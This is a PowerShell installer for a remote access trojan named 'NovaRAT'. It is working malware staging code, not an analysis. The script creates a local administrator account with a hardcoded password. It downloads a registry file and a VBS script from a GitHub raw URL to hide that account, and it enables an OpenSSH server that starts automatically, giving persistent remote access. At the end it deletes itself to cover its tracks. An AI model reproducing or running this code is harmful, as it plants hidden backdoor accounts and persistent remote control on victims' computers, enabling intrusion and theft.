# builds resources for rat
# made by : Code0

# random String for directories
function random_text {
    return -join((65..90)+(97..122) | Get-Random -Count 5 | % {[char]$_})
}

# create local admin for rat
function create_account {
    [CmdletBinding()]
    param (
        [string] $uname,
        [securestring] $pword
    )
    begin {
    }
    process {
        New-LocalUser "$uname" -pword $pword -FullName "$uname" -Description "Temporary local admin" 
        Write-Verbose "$uname local user created"
        Add-LocalGroupMember -Group "Administrators" -Member "$uname"
        Write-Verbose "$NewLocalAdmin added to the local administrator group"
    }
    end{
    }
}

## variables
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location

#create admin user
$uname = "novarat"
$pword = (ConvertTo-SecureString "NovaRat!" -AsPlainText -Force)
create_account -uname $uname -pword $pword

#goto temp, make working direcrtory
mkdir $path
cd $path

#registry to hide local admin
$reg_file = random_text
Invoke-WebRequest -Uri raw.githubusercontent.com/fazelastblood/NovaRAT/main/files/admin.reg -OutFile "$reg_file.reg"

#visual basic script to register the registry
$vbs_file = random_text
Invoke-WebRequest -Uri raw.githubusercontent.com/fazelastblood/NovaRAT/main/files/confirm.vbs -OutFile "$vbs_file.vbs"

#install the registry
./"$reg_file.reg";"$vbs_file.vbs"

#enabling persistent ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*

# self delete
cd $initial_dir
del installer.ps1

